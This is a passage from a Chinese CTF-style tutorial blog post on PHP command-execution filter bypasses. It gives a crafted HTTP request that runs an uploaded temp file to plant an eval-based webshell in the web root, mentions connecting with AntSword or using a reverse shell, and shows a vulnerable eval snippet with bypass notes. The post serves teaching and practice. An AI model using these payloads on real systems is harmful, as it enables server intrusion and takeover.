+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /php_cmd/php80/class11/3.php?cmd=?%3E%3C?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?%3E HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Type: multipart/form-data;boundary=--------123</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection:close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 144</span><br><span class="line">//此处有一行空行</span><br><span class="line">--------123</span><br><span class="line">Content-Disposition:form-data;name=&quot;file&quot;;filename=&quot;1.txt&quot;</span><br><span class="line">//此处也有一行空行</span><br><span class="line">echo &quot;&lt;?php eval(\$_POST[&#x27;shell&#x27;]);&quot; &gt; /www/admin/localhost_80/wwwroot/class11/success.php</span><br><span class="line">--------123</span><br></pre></td></tr></table></figure>
+<p>创建成功后使用蚁剑连接即可<br>使用一句话木马需要知道绝对路径，可以使用反弹shell  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">无字母数字过滤;~^`&amp;|  </span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!preg_match(&#x27;/[a-z0-9;~^`&amp;|]/is&#x27;,$_GET[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>~</code>,<code>^</code>都被过滤，可以使用自增法构造，<code>;</code>被过滤，可以使用短标签法代替  </p>
 </div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-06-14</span><i class="fa fa-tag"></i><a class="tag" href="/tags/web基础/" title="web基础">web基础 </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2022/06/14/PHP命令执行从0到1/,2js56's blog,PHP命令执行从0到1,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2022/06/29/SSTI%E9%80%9A%E5%A4%A9%E6%8C%87%E5%8C%97/" title="SSTI通天指北">Post Anterior</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2022/05/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">Próximo post</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
